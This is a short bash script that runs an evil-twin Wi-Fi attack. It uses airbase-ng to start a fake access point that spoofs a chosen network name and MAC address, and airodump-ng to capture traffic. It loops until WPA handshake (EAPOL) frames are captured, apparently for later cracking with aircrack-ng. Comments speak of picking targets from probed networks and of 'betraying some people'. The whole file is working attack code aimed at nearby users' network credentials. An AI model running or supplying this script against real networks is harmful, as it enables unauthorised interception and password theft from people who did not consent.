#!/bin/bash


essid=$1
#$essid=`./clientsprobes.py wlan0mon 10000`

echo "from the bash $essid \n Aweseome.... AIRBASE_NG is about to begin"
#'''#sleep 60


#add read command when you are selecting essid to attack with grep " 1 " test.txt | cut -f 4- -d " "... with this command, we wrote the probes to a file then opened it to grep out the one we have selevted
#essid=``
echo "\n \n     starting a fake AP with MAC address B8-95-50-4F-CA-52 \n\n"
airbase-ng  --essid $essid -c 1 -Z 4 -a B8-95-50-4F-CA-52 wlan0mon  &> /dev/null & #if you don't want to see the output 
echo "sleeping for 10 seconds\n\n"
sleep 10
echo "\n Airodump begins \n\n"
echo "\n   \n  Give me a few seconds... currently betraying some people \n \n"

airodump-ng wlan0mon --channel 1 --essid $essid -w $essid &>> handshakecheck.txt & # piping airodump output to hadshakecheck.txt

while true
do
	handshakedetect=`grep handshake handshakecheck.txt &` #check for handshake in airodump file
	sleep 10
	if [[ -n $handshakedetect ]]
	then
		echo "\n	i am currently detecting the handshakes"
		killall airodump-ng & #run aircrack-ng. you can let users input by using 'read ' command
		killall airbase-ng &
		echo "			\n Just Killed AIRODUMP and AIRBASE because we got the EAPOL FRAMES.....VICTORY DANCE"
		break
	fi
done

